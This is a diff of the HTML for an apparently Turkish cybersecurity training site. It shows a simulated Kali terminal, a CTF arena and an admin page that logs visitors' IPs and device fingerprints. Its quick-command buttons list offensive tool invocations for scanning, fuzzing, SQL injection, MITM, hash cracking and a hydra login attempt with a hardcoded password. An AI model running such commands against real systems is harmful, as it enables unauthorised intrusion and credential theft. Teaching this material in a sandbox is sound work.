+                                    const rotateX = -yPct * 8;
+                                    const rotateY = xPct * 8;
+                                    card.style.transform = 'perspective(1000px) rotateX(' + rotateX.toFixed(2) + 'deg) rotateY(' + rotateY.toFixed(2) + 'deg) translateY(-2px)';
                                     if (glare) {
-                                        glare.style.background = 'radial-gradient(circle at ' + x + 'px ' + y + 'px, rgba(0, 229, 255, 0.16), transparent 70%)';
+                                        glare.style.background = 'radial-gradient(circle at ' + x + 'px ' + y + 'px, rgba(0, 229, 255, 0.14), transparent 70%)';
                                     }
                                 });
-
                                 card.addEventListener('mouseleave', () => {
                                     card.style.transform = 'perspective(1000px) rotateX(0deg) rotateY(0deg) translateY(0px)';
                                 });
@@ -949,13 +1046,14 @@
                         }
 
                         if (document.readyState === 'loading') {
-                            document.addEventListener('DOMContentLoaded', initConsole);
+                            document.addEventListener('DOMContentLoaded', initHomepageInteractions);
                         } else {
-                            setTimeout(initConsole, 200);
+                            setTimeout(initHomepageInteractions, 100);
                         }
                     })();
                     </script>
                 </section>
+
                 <!-- ==========================================
                      PAGE: SİBER AKADEMİ (YENİ SİBER RANGE ODALARI)
                      ========================================== -->
@@ -986,29 +1084,28 @@
                                 <span>🎯 Tüm Akademi Odalarını Başlat</span>
                                 <span>&rarr;</span>
                             </a>
-                            <a href="academy.html?track=red&room=red-101" class="btn-secondary" style="text-decoration: none; padding: 13px 20px; font-size: 13.5px; border-color: rgba(239, 68, 68, 0.4); color: #f87171;">
+                            <a href="academy.html?track=red" class="btn-secondary" style="text-decoration: none; padding: 13px 20px; font-size: 13.5px; border-color: rgba(239, 68, 68, 0.4); color: #f87171;">
                                 ⚔️ Red Team Odaları (12 Görev)
                             </a>
-                            <a href="academy.html?track=blue&room=blue-101" class="btn-secondary" style="text-decoration: none; padding: 13px 20px; font-size: 13.5px; border-color: rgba(59, 130, 246, 0.4); color: #60a5fa;">
+                            <a href="academy.html?track=blue" class="btn-secondary" style="text-decoration: none; padding: 13px 20px; font-size: 13.5px; border-color: rgba(59, 130, 246, 0.4); color: #60a5fa;">
                                 🛡️ Blue Team Odaları (12 Görev)
                             </a>
-                            <a href="academy.html?track=purple&room=purple-101" class="btn-secondary" style="text-decoration: none; padding: 13px 20px; font-size: 13.5px; border-color: rgba(168, 85, 247, 0.4); color: #c084fc;">
+                            <a href="academy.html?track=purple" class="btn-secondary" style="text-decoration: none; padding: 13px 20px; font-size: 13.5px; border-color: rgba(168, 85, 247, 0.4); color: #c084fc;">
                                 🟣 Purple Team Odaları (9 Görev)
                             </a>
                         </div>
                     </div>
-                </section><!-- ==========================================
+                </section>
+
+                <!-- ==========================================
                      PAGE: SİBER KOD KÜTÜPHANESİ (142+ GERÇEK KOMUT & SCRIPT)
                      ========================================== -->
                 <section class="app-page page-hidden" id="page-commands">
                     <div class="page-header" data-reveal>
                         <div class="page-title-block">
-                            <div class="page-tier-badge"
-                                style="background: rgba(0, 229, 255, 0.15); color: var(--cyan); border-color: var(--cyan);">
-                                142+ ÇALIŞTIRILABİLİR KOMUT &amp; SCRIPT</div>
+                            <div class="page-tier-badge" style="background: rgba(0, 229, 255, 0.15); color: var(--cyan); border-color: var(--cyan);">142+ ÇALIŞTIRILABİLİR KOMUT &amp; SCRIPT</div>
                             <h1 class="page-main-heading">Siber Kod Kütüphanesi &amp; Komut Merkezi</h1>
-                            <p class="page-subheading">Linux Temellerinden İleri Ağ Taramasına, Web Zafiyetlerinden
-                                Firewall Kurallarına 142+ Hazır Komut ve Script</p>
+                            <p class="page-subheading">Linux Temellerinden İleri Ağ Taramasına, Web Zafiyetlerinden Firewall Kurallarına 142+ Hazır Komut ve Script</p>
                         </div>
                         <div class="page-actions-block">
                             <button class="btn-glow-blue" id="btn-open-terminal-from-commands">
@@ -1021,27 +1118,23 @@
                     <div style="margin-top: 10px;" data-reveal>
                         <div class="panel-header" style="margin-bottom: 16px; flex-wrap: wrap; gap: 12px;">
                             <div class="panel-title">
-                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--cyan)"
-                                    stroke-width="2">
-                                    <polyline points="4 17 10 11 4 5" />
-                                    <line x1="12" y1="19" x2="20" y2="19" />
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--cyan)" stroke-width="2">
+                                    <polyline points="4 17 10 11 4 5"/>
+                                    <line x1="12" y1="19" x2="20" y2="19"/>
                                 </svg>
                                 <span>142+ Gerçek Siber Güvenlik Komut &amp; Script Kütüphanesi</span>
                             </div>
-                            <span class="badge-soft-cyan" id="academy-count-badge">142 KOMUT YÜKLENDİ &bull; CANLI
-                                SİMÜLASYON</span>
+                            <span class="badge-soft-cyan" id="academy-count-badge">142 KOMUT YÜKLENDİ &bull; CANLI SİMÜLASYON</span>
                         </div>
 
                         <!-- Academy Command Search & Filter Pills -->
                         <div class="filter-bar" style="margin-bottom: 20px;">
                             <div class="search-input-wrap">
-                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                                    stroke-width="2">
-                                    <circle cx="11" cy="11" r="8" />
-                                    <line x1="21" y1="21" x2="16.65" y2="16.65" />
+                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <circle cx="11" cy="11" r="8"/>
+                                    <line x1="21" y1="21" x2="16.65" y2="16.65"/>
                                 </svg>
-                                <input type="text" id="academy-cmd-search"
-                                    placeholder="140+ komut veya araç ara (örn: nmap, hping3, gobuster, hydra, port, dosya, parola, syn)..." />
+                                <input type="text" id="academy-cmd-search" placeholder="140+ komut veya araç ara (örn: nmap, hping3, gobuster, hydra, port, dosya, parola, syn)..." />
                             </div>
                             <div class="filter-pills" id="academy-category-pills">
                                 <button class="filter-pill active" data-cat="all">Tümü (140+)</button>
@@ -1063,78 +1156,63 @@
                             <!-- Injected dynamically via app.js -->
                         </div>
                     </div>
-                </section><!-- ==========================================
-                     PAGE 5: KALI LINUX WEB TERMINAL (LIVE CLI SIMULATOR)
+                </section>
+
+                <!-- ==========================================
+                     PAGE 5: KALI LINUX WEB TERMINAL (LIVE CLI)
                      ========================================== -->
                 <section class="app-page page-hidden" id="page-terminal">
                     <div class="page-header" data-reveal>
                         <div class="page-title-block">
                             <div class="page-tier-badge">ETKİLEŞİMLİ SİMÜLASYON LABI</div>
                             <h1 class="page-main-heading">Kali Linux Web Terminal // Canlı Siber Sandbox</h1>
-                            <p class="page-subheading">İnternet Bağlantısı Olmadan Güvenle Nmap, Gobuster, Hping3 ve
-                                MITM Komutlarını Test Edin</p>
+                            <p class="page-subheading">İnternet Bağlantısı Olmadan Güvenle 32+ Linux &amp; Pentest Komutunu Test Edin</p>
                         </div>
                     </div>
 
-                    <!-- Quick Command Chips Bar (Click-to-Type & Run) -->
+                    <!-- Quick Command Chips Bar -->
                     <div class="quick-labs-bar" data-reveal>
-                        <div
-                            style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
-                            <span
-                                style="font-size: 12px; font-weight: 700; color: var(--cyan); letter-spacing: 0.5px;">⚡
-                                HIZLI KOMUT PALETİ (Tıklayarak Terminalde Çalıştırın):</span>
-                            <span
-                                style="font-size: 11px; color: var(--text-muted); font-family: var(--font-mono);">Otomatik
-                                Komut Enjeksiyonu</span>
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                            <span style="font-size: 12px; font-weight: 700; color: var(--cyan); letter-spacing: 0.5px;">⚡ HIZLI KOMUT PALETİ (Tıklayarak Terminalde Çalıştırın):</span>
+                            <span style="font-size: 11px; color: var(--text-muted); font-family: var(--font-mono);">32 Hazır Komut</span>
                         </div>
                         <div class="quick-labs-filter-row">
-                            <button class="quick-cmd-btn" data-terminal-cmd="nmap -p- 127.0.0.1">🔍 nmap -p-
-                                127.0.0.1</button>
-                            <button class="quick-cmd-btn" data-terminal-cmd="nmap -sV -p 80,443 127.0.0.1">🔍 nmap -sV
-                                Servis</button>
-                            <button class="quick-cmd-btn"
-                                data-terminal-cmd="gobuster dir -u http://127.0.0.1 -w common.txt">📁 gobuster
-                                dir</button>
-                            <button class="quick-cmd-btn"
-                                data-terminal-cmd="ffuf -u http://127.0.0.1/FUZZ -w common.txt">⚡ ffuf Fuzzing</button>
-                            <button class="quick-cmd-btn" data-terminal-cmd="nikto -h 127.0.0.1">🛡️ nikto Web
-                                Scan</button>
-                            <button class="quick-cmd-btn" data-terminal-cmd="sudo hping3 -S -p 80 -c 1 127.0.0.1">📡
-                                hping3 SYN Probe</button>
-                            <button class="quick-cmd-btn" data-terminal-cmd="sudo hping3 -A -p 80 -c 1 127.0.0.1">🛡️
-                                hping3 ACK Firewall</button>
-                            <button class="quick-cmd-btn" data-terminal-cmd="sudo nmap -sn 192.168.1.0/24">📡 nmap Ping
-                                Sweep</button>
-                            <button class="quick-cmd-btn" data-terminal-cmd="sudo nmap -O 192.168.1.17">🖥️ nmap -O OS
-                                Tespit</button>
-                            <button class="quick-cmd-btn" data-terminal-cmd="bettercap -iface lo">⚔️ bettercap
-                                MITM</button>
-                            <button class="quick-cmd-btn"
-                                data-terminal-cmd="hydra -l admin -p Sebu132009 192.168.1.1 http-get /">🔑 hydra Auth
-                                Test</button>
-                            <button class="quick-cmd-btn"
-                                data-terminal-cmd="sqlmap -u http://127.0.0.1/api/search?q=test --dbs">💉 sqlmap
-                                Enjeksiyon</button>
-                            <button class="quick-cmd-btn" data-terminal-cmd="powershell .\Audit-Headers.ps1">📜
-                                PowerShell Başlık Denetimi</button>
-                            <button class="quick-cmd-btn" data-terminal-cmd="powershell .\Port-Scan.ps1">📜 PowerShell
-                                Çok Kanallı Port Tara</button>
-                            <button class="quick-cmd-btn" data-terminal-cmd="help">❓ help (115+ Araç)</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="nmap -p- 127.0.0.1">🔍 nmap -p-</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="nmap 8080/tcp">🔍 nmap 8080</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="gobuster dir -u http://192.168.1.1 -w common.txt">📁 gobuster</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="ffuf -u http://127.0.0.1/FUZZ -w common.txt">⚡ ffuf</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="sqlmap -u &quot;http://127.0.0.1/api/blog?tag=test&quot; --dbs">💉 sqlmap</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="sudo hping3 -S -p 80 -c 1 192.168.1.1">🛡️ hping3 SYN</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="sudo hping3 -A -p 80 -c 1 192.168.1.1">🛡️ hping3 ACK</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="sudo nmap -sn 192.168.1.0/24">📡 ping sweep</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="sudo nmap -O 192.168.1.17">🖥️ nmap -O</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="bettercap -iface lo">⚔️ bettercap</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="hydra -l admin -p Sebu132009 192.168.1.1 http-get /">🔑 hydra</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="sudo tcpdump -i eth0 -nn -s0 -v port 80">📡 tcpdump</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="wpscan --url http://192.168.1.1/blog --enumerate u,vp">🔍 wpscan</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt">🔑 john</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt">⚡ hashcat</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="ss -tulpn">🔌 ss -tulpn</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="sudo lsof -i :80">🔌 lsof -i :80</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="sudo iptables -L -n -v">🛡️ iptables</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="curl -I -k https://127.0.0.1:5000">🌐 curl -I</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="msfconsole -q -x &quot;banner; version&quot;">☠️ msfconsole</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="powershell .\Audit-Headers.ps1">📜 PowerShell Başlık Denetimi</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="powershell .\Port-Scan.ps1">📜 PowerShell Çok Kanallı Port Tara</button>
+                            <button class="quick-cmd-btn" data-terminal-cmd="help">❓ help</button>
                             <button class="quick-cmd-btn" data-terminal-cmd="clear">🧹 clear</button>
                         </div>
                     </div>
 
-                    <!-- Authentic Kali Linux Terminal Window (Matches Screenshot) -->
+                    <!-- Kali Linux Terminal Window (Matches Screenshot) -->
                     <div class="kali-terminal-wrapper" data-reveal>
-                        <!-- Multi-Tab Titlebar -->
                         <div class="kali-titlebar">
-                            <div class="kali-tabs-header-left">
-                                <div class="kali-tabs-bar" id="kali-tabs-bar">
-                                    <!-- Dynamic tabs injected by app.js -->
+                            <div style="display: flex; align-items: center; height: 100%; gap: 6px;">
+                                <div class="kali-tab-active">
+                                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+                                    <span>Sunny@SUNNY: ~</span>
                                 </div>
-                                <button type="button" class="kali-add-tab-btn" id="btn-kali-add-tab"
-                                    title="Yeni Terminal Sekmesi Aç (+)">+</button>
-                                <button type="button" class="kali-tab-menu-btn" title="Sekme Seçenekleri">&or;</button>
+                                <span style="font-size: 16px; color: #52525b; margin-left: 4px; cursor: pointer;">+</span>
                             </div>
                             <div class="kali-window-controls">
                                 <span class="kali-window-btn">&minus;</span>
@@ -1143,55 +1221,42 @@
                             </div>
                         </div>
 
-                        <!-- Terminal Body & History -->
                         <div class="kali-terminal-body" id="kali-terminal-body">
-                            <!-- Kali MOTD banner from screenshot -->
                             <div class="kali-motd">
-                                <div class="motd-line motd-red">┌──(Message from Kali developers)</div>
-                                <div class="motd-line">│</div>
-                                <div class="motd-line">│ This is an educational interactive sandbox of Kali Linux &amp;
-                                    LFL (LostFromLight) Defense.</div>
-                                <div class="motd-line">│ All simulations run safely in-browser with zero illegal or
-                                    harmful actions.</div>
-                                <div class="motd-line">│ Learn how:</div>
-                                <div class="motd-line">│ &rArr;
-                                    https://www.kali.org/docs/troubleshooting/common-minimum-setup/</div>
-                                <div class="motd-line">│</div>
-                                <div class="motd-line motd-gray">└──(Run: "touch ~/.hushlogin" to hide this message)
-                                </div>
+<span class="motd-red">┌──(Message from Kali developers)</span>
+│
+│ This is an educational interactive sandbox of Kali Linux &amp; LFL Defense.
+│ All simulations run safely in-browser with zero illegal or harmful actions.
+│ Learn how:
+│ &rArr; https://www.kali.org/docs/troubleshooting/common-minimum-setup/
+│
+<span class="motd-gray">└──(Run: "touch ~/.hushlogin" to hide this message)</span>
                             </div>
 
-                            <!-- Command Output History Zone -->
                             <div id="kali-history-zone"></div>
 
-                            <!-- Active Live Command Prompt -->
                             <div class="kali-input-line-block">
                                 <div class="kali-prompt-line1">
-                                    ┌──(<span class="kali-user">Sunny</span><span class="kali-skull">㉿</span><span
-                                        class="kali-host">SUNNY</span>)-[<span class="kali-path">~</span>]
+                                    ┌──(<span class="kali-user">Sunny</span><span class="kali-skull">㉿</span><span class="kali-host">SUNNY</span>)-[<span class="kali-path">~</span>]
                                 </div>
                                 <div class="kali-input-row">
                                     <span class="kali-prompt-line2">└─$</span>
-                                    <input type="text" id="kali-cmd-input" class="kali-cli-input" autofocus
-                                        autocomplete="off" spellcheck="false"
-                                        placeholder="Komut yazın (örn: nmap -p- 127.0.0.1 veya 'help')..." />
+                                    <input type="text" id="kali-cmd-input" class="kali-cli-input" autofocus autocomplete="off" spellcheck="false" placeholder="Komut yazın (örn: nmap -p- 127.0.0.1 veya 'help')..." />
                                 </div>
                             </div>
                         </div>
                     </div>
-                </section><!-- ==========================================
+                </section>
+
+                <!-- ==========================================
                      PAGE: SİBER ROL & TAKIM TESTİ (RED vs BLUE vs PURPLE)
                      ========================================== -->
                 <section class="app-page page-hidden" id="page-quiz">
                     <div class="page-header" data-reveal>
                         <div class="page-title-block">
-                            <div class="page-tier-badge"
-                                style="background: rgba(192, 132, 252, 0.15); color: #c084fc; border-color: #c084fc;">0
-                                KOD BİLGİSİ &bull; KİŞİLİK &amp; YETENEK TESTİ</div>
+                            <div class="page-tier-badge" style="background: rgba(192, 132, 252, 0.15); color: #c084fc; border-color: #c084fc;">KARİYER &amp; YETENEK TESTİ</div>
                             <h1 class="page-main-heading">Siber Rol Testi: Hangi Takıma Yatkınsın?</h1>
-                            <p class="page-subheading">0 Yazılım ve 0 Siber Güvenlik Bilgisi Gerektirmeyen Günlük Hayat
-                                Senaryolarıyla 10 Soruda Red Team (Hücum), Blue Team (Savunma) veya Purple Team
-                                (Strateji) Yeteneğini Keşfet.</p>
+                            <p class="page-subheading">10 soruluk interaktif kişilik ve senaryo testi ile Red Team (Hücum), Blue Team (Savunma) veya Purple Team (Entegre Strateji) yeteneğini keşfet.</p>
                         </div>
                         <div class="page-actions-block">
                             <button class="btn-secondary" id="btn-restart-quiz">Testi Baştan Başlat</button>
@@ -1205,27 +1270,55 @@
                     </div>
                 </section>
 
-                <!-- ==========================================
-                     PAGE: SİBER CTF ARENASI (6 AŞAMALI SIZMA OPERASYONU)
-                     ========================================== -->
                 <section class="app-page page-hidden" id="page-ctf">
                     <!-- Page Header -->
                     <div class="page-header" data-reveal>
                         <div class="page-title-block">
                             <div class="page-tier-badge"
-                                style="background: rgba(239, 68, 68, 0.15); color: #ef4444; border-color: #ef4444;">6
-                                KADEMELİ SIZMA &bull; 142 KOD İLE ÇÖZÜLÜR</div>
-                            <h1 class="page-main-heading">Siber CTF Arenası // Bayrak Avı</h1>
-                            <p class="page-subheading">Kütüphanedeki 142 Kali Linux kodunu kullanarak hedefleri analiz
-                                et, açıkları sömür ve gizli bayrakları (flag) ele geçir.</p>
+                                style="background: rgba(239, 68, 68, 0.15); color: #ef4444; border-color: #ef4444;" data-i18n="ctf_tier_badge">10
+                                KADEMELİ SIZMA OPERASYONU &bull; RED / BLUE / PURPLE ARENA</div>
+                            <h1 class="page-main-heading" data-i18n="ctf_main_heading">Siber CTF Arenası // Bayrak Avı 2.0</h1>
+                            <p class="page-subheading" data-i18n="ctf_main_sub">Ağ keşfinden Active Directory Kerberoasting'e, SOC C2 avından Kernel Rootkit analizine uzanan 10 gerçekçi operasyonda bayrakları (flag) ele geçir.</p>
                         </div>
                         <div class="page-actions-block">
                             <button type="button" class="btn-glow-blue btn-sm hidden" id="btn-admin-bypass-ctf"
                                 style="background: linear-gradient(135deg, #f59e0b, #ef4444); color: #000; font-weight: 800; border: none; box-shadow: 0 0 15px rgba(245, 158, 11, 0.4);"
-                                title="Yönetici Root Anahtarı ile tüm 6 aşamayı anında aç (+2300 XP)">👑 Master Root
+                                title="Yönetici Root Anahtarı ile tüm 10 aşamayı anında aç (+6000 XP)">👑 Master Root
                                 Key: Tüm Seviyeleri Aç</button>
                             <button class="btn-secondary btn-sm" id="btn-reset-ctf-progress"
-                                title="Tüm ilerlemeyi sıfırla">🔄 Sıfırla</button>
+                                title="Tüm ilerlemeyi sıfırla" data-i18n="ctf_btn_reset">🔄 Sıfırla</button>
+                        </div>
+                    </div>
+
+                    <!-- Live Cyber Telemetry HUD Cards -->
+                    <div class="ctf-hud-grid" data-reveal>
+                        <div class="ctf-hud-card">
+                            <div class="ctf-hud-icon" style="color: #00e5ff; background: rgba(0, 229, 255, 0.1);">🎯</div>
+                            <div class="ctf-hud-info">
+                                <span class="ctf-hud-label" data-i18n="ctf_hud_target_lbl">AKTİF HEDEF DÜĞÜMÜ</span>
+                                <strong class="ctf-hud-val" id="ctf-hud-target">10.10.1.5</strong>
+                            </div>
+                        </div>
+                        <div class="ctf-hud-card">
+                            <div class="ctf-hud-icon" style="color: #10b981; background: rgba(16, 185, 129, 0.1);">⚔️</div>
+                            <div class="ctf-hud-info">
+                                <span class="ctf-hud-label" data-i18n="ctf_hud_ops_lbl">OPERASYON DURUMU</span>
+                                <strong class="ctf-hud-val" id="ctf-hud-solved">0 / 10 Tamamlandı</strong>
+                            </div>
+                        </div>
+                        <div class="ctf-hud-card">
+                            <div class="ctf-hud-icon" style="color: #f59e0b; background: rgba(245, 158, 11, 0.1);">⏱️</div>
+                            <div class="ctf-hud-info">
+                                <span class="ctf-hud-label" data-i18n="ctf_hud_timer_lbl">OPERASYON SÜRESİ</span>
+                                <strong class="ctf-hud-val" id="ctf-hud-timer">00:00</strong>
+                            </div>
+                        </div>
+                        <div class="ctf-hud-card">
+                            <div class="ctf-hud-icon" style="color: #c084fc; background: rgba(192, 132, 252, 0.1);">🏆</div>
+                            <div class="ctf-hud-info">
+                                <span class="ctf-hud-label" data-i18n="ctf_hud_rank_lbl">OPERATÖR RÜTBESİ</span>
+                                <strong class="ctf-hud-val" id="ctf-hud-rank-short">🔰 Çaylak Analist</strong>
+                            </div>
                         </div>
                     </div>
 
@@ -1236,16 +1329,23 @@
                                 <span class="pulsing-beacon"
                                     style="background: #ef4444; box-shadow: 0 0 8px #ef4444;"></span>
                                 <span id="ctf-progress-text"
-                                    style="font-weight: 800; font-size: 13px; color: #ffffff;">İlerleme: 0/6 Tamamlandı
+                                    style="font-weight: 800; font-size: 13px; color: #ffffff;">İlerleme: 0/10 Görev Tamamlandı
                                     (%0)</span>
                             </div>
                             <div class="ctf-stepper-meta-row">
-                                <span class="ctf-rank-badge" id="ctf-current-rank">Rütbe: Çaylak Analist</span>
-                                <span class="ctf-xp-badge" id="ctf-total-xp">0 XP</span>
+                                <div class="ctf-category-filter-pills" id="ctf-track-filters">
+                                    <button type="button" class="ctf-filter-pill active" data-ctf-filter="all" data-i18n="ctf_flt_all">Tümü (10)</button>
+                                    <button type="button" class="ctf-filter-pill" data-ctf-filter="recon" data-i18n="ctf_flt_recon">🌐 Keşif &amp; Web</button>
+                                    <button type="button" class="ctf-filter-pill" data-ctf-filter="red" data-i18n="ctf_flt_red">🔴 Red Team</button>
+                                    <button type="button" class="ctf-filter-pill" data-ctf-filter="blue" data-i18n="ctf_flt_blue">🔵 Blue &amp; Adli</button>
+                                    <button type="button" class="ctf-filter-pill" data-ctf-filter="boss" data-i18n="ctf_flt_boss">🟣 Final Boss</button>
+                                </div>
+                                <span class="ctf-rank-badge" id="ctf-current-rank">Rütbe: 🔰 Çaylak Analist</span>
+                                <span class="ctf-xp-badge" id="ctf-total-xp">TOPLAM XP: 0 / 6000</span>
                             </div>
                         </div>
 
-                        <!-- 6 Horizontal Stage Navigation Buttons in a single clean row -->
+                        <!-- 10 Stage Navigation Buttons in a clean 5x2 grid -->
                         <div class="ctf-stepper-tabs" id="ctf-stage-nav">
                             <!-- Injected dynamically via app.js -->
                         </div>
@@ -1278,10 +1378,13 @@
                                         root@kali-ctf:~# [10.10.1.5]
                                     </div>
                                     <div class="ctf-term-btn-group">
+                                        <button type="button" class="ctf-tiny-btn" id="btn-ctf-run-next-step"
+                                            style="border-color: rgba(0, 229, 255, 0.4); color: #00e5ff;"
+                                            title="Sıradaki önerilen görev komutunu otomatik çalıştır" data-i18n="ctf_btn_autostep">⚡ Sıradaki Adımı Çalıştır</button>
                                         <button type="button" class="ctf-tiny-btn" id="btn-clear-ctf-term"
-                                            title="Ekranı Temizle">🧹 Temizle</button>
+                                            title="Ekranı Temizle" data-i18n="ctf_btn_clear">🧹 Temizle</button>
                                         <button type="button" class="ctf-tiny-btn" id="btn-reset-ctf-term"
-                                            title="Yeniden Başlat">🔄 Yenile</button>
+                                            title="Yeniden Başlat" data-i18n="ctf_btn_restart">🔄 Yenile</button>
                                     </div>
                                 </div>
 
@@ -1291,185 +1394,83 @@
                                         <span class="ctf-prompt-symbol"
                                             id="ctf-term-prompt-label">root@kali-ctf:~#</span>
                                         <input type="text" class="ctf-screen-input" id="ctf-term-command-input"
-                                            placeholder="Komut yazın (örn: nmap -sV 10.10.1.5)..." autocomplete="off"
+                                            placeholder="Komut yazın (örn: nmap -sV 10.10.1.5) veya Tab'a basın..." data-i18n-placeholder="ctf_input_placeholder" autocomplete="off"
                                             spellcheck="false" />
                                     </div>
                                 </div>
 
                                 <div class="ctf-term-bottom-bar">
-                                    <span>💡 İpuçlarındaki komutları elinizle yazabilir veya <kbd
+                                    <span data-i18n="ctf_term_footer_tip">💡 İpucu: Sol paneldeki adımların yanındaki <strong>[⚡ Çalıştır]</strong> butonuna basabilir, komutu elinizle yazabilir veya <kbd
                                             style="background: rgba(0,229,255,0.15); color: #00e5ff; padding: 1px 5px; border-radius: 3px; font-weight: 700;">Tab</kbd>
-                                        tuşuna basarak otomatik tamamlayabilirsiniz.</span>
+                                        tuşuyla tamamlayabilirsiniz.</span>
                                 </div>
                             </div>
                         </div>
                     </div>
                 </section>
+
                 <!-- ==========================================
-                     PAGE: SİBER KILAVUZ & SÖZLÜK (A-Z)
+                     PAGE 9: SİBER KILAVUZ & SÖZLÜK (A-Z)
                      ========================================== -->
                 <section class="app-page page-hidden" id="page-glossary">
                     <div class="page-header" data-reveal>
                         <div class="page-title-block">
-                            <div class="page-tier-badge" id="glossary-badge-count">80+ KAPSAMLI SİBER TERİM &amp; ANALOJİ</div>
-                            <h1 class="page-main-heading">Siber Terimler Kılavuzu &amp; A-Z Sözlük</h1>
-                            <p class="page-subheading">0 Yazılım ve 0 Siber Güvenlik Bilgisine Sahip Kişiler İçin Günlük
-                                Hayat Benzetmeli Sade Rehber</p>
+                            <div class="page-tier-badge">TEMEL REHBER</div>
+                            <h1 class="page-main-heading" data-i18n="glossary_main_heading">Siber Terimler Kılavuzu &amp; A-Z Sözlük</h1>
+                            <p class="page-subheading" data-i18n="glossary_main_subheading">0 Yazılım ve 0 Siber Güvenlik Bilgisine Sahip Kişiler İçin Günlük Hayat Benzetmeli Rehber</p>
                         </div>
                     </div>
 
-                    <div class="filter-bar" data-reveal>
-                        <div class="search-input-wrap">
-                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                                stroke-width="2">
-                                <circle cx="11" cy="11" r="8" />
-                                <line x1="21" y1="21" x2="16.65" y2="16.65" />
-                            </svg>
-                            <input type="text" id="glossary-search-input"
-                                placeholder="Siber terim veya kısaltma ara (örn: MFA, HSTS, JWT, SQLi, Port, Handshake, Nmap)..." />
+                    <!-- Glossary Search Bar (Dark Styled, No Glaring White Box!) -->
+                    <div class="glossary-search-toolbar" data-reveal>
+                        <div class="glossary-input-wrap">
+                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+                            <input type="text" id="glossary-search-input" class="glossary-search-input" placeholder="Terim ara (örn: MFA, HSTS, JWT, SQLite, MassTransit)..." />
                         </div>
                         <div class="filter-pills" id="glossary-category-pills">
-                            <button class="filter-pill active" data-cat="all">Tümü (80+)</button>
-                            <button class="filter-pill" data-cat="auth">Kimlik &amp; Oturum</button>
-                            <button class="filter-pill" data-cat="network">Ağ &amp; Protokoller</button>
-                            <button class="filter-pill" data-cat="attacks">Saldırı Türleri</button>
-                            <button class="filter-pill" data-cat="defense">Savunma &amp; Şifreleme</button>
-                            <button class="filter-pill" data-cat="tools">Siber Araçlar (Kali)</button>
+                            <button class="filter-pill active" data-cat="all" data-i18n="glossary_cat_all">Tümü (16)</button>
+                            <button class="filter-pill" data-cat="auth" data-i18n="glossary_cat_auth">Kimlik &amp; Oturum</button>
+                            <button class="filter-pill" data-cat="network" data-i18n="glossary_cat_network">Ağ &amp; Kalkanlar</button>
+                            <button class="filter-pill" data-cat="backend" data-i18n="glossary_cat_backend">Arka Plan &amp; Kuyruk</button>
                         </div>
                     </div>
 
                     <div class="glossary-cards-grid" id="glossary-cards-container" data-reveal-stagger></div>
-                </section><!-- ==========================================
-                     PAGE 10: ZİYARETÇİ & SİSTEM LOGLARI (ADMIN ONLY)
+                </section>
+
+                <!-- ==========================================
+                     PAGE 10: ADMIN ACCESS LOGS (ADMIN ONLY)
                      ========================================== -->
                 <section class="app-page page-hidden" id="page-logs">
                     <div class="page-header" data-reveal>
                         <div class="page-title-block">
-                            <div class="page-tier-badge" data-i18n="logs_badge">GÜVENLİK AUDİT &amp; TELEMETRİ</div>
-                            <h1 class="page-main-heading" data-i18n="logs_main_heading">Ziyaretçi &amp; İstemci Erişim
-                                Logları</h1>
-                            <p class="page-subheading" data-i18n="logs_main_subheading">Sisteme bağlanan gerçek
-                                istemcilerin IP adresi, işletim sistemi, tarayıcısı ve cihaz parmak izi</p>
+                            <div class="page-tier-badge" style="color: var(--red); border-color: var(--red);" data-i18n="logs_badge">GÜVENLİK AUDİT &amp; TELEMETRİ</div>
+                            <h1 class="page-main-heading" data-i18n="logs_main_heading">Ziyaretçi &amp; İstemci Erişim Logları</h1>
+                            <p class="page-subheading" data-i18n="logs_main_subheading">Sisteme bağlanan gerçek istemcilerin IP adresi, işletim sistemi, tarayıcısı ve cihaz parmak izi</p>
                         </div>
                         <div class="page-actions-block">
-                            <button type="button" class="btn-secondary" id="btn-clear-logs"
-                                style="color: #ef4444; border-color: rgba(239, 68, 68, 0.4);"
-                                title="Tüm log kayıtlarını temizle">
-                                <span>🧹 Logları Temizle</span>
-                            </button>
-                            <button class="btn-secondary" id="btn-export-logs" data-i18n="btn_export_logs">
-                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
-                                    stroke-width="2">
-                                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
